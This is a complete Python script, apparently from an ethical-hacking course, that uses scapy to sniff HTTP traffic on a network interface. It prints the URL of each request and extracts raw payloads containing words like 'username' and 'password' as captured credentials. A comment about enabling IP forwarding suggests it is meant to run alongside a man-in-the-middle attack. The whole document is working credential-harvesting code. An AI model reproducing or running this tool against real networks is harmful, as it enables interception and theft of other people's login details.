#!/usr/bin/env python

#check before sniffing
#echo 1 > /proc/sys/net/ipv4/ip_forward

import scapy.all as scapy
from scapy.layers import http
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option( "--interface", dest="interface", help="Interface on which you want to listen")
    # parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP Address")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify Interface")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)  # filter="port 21"


def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "password", "user", "login", "pass"]
        for keyword in keywords:
            if keyword in str(load):
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = str(get_url(packet))
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible Usernames and Passwords >>\n**********************************************************\n"+str(login_info)+"\n**********************************************************\n")


options = get_arguments()
interface = options.interface
print("Started listening on "+interface+":\n**********************************************************\n")
sniff(interface)
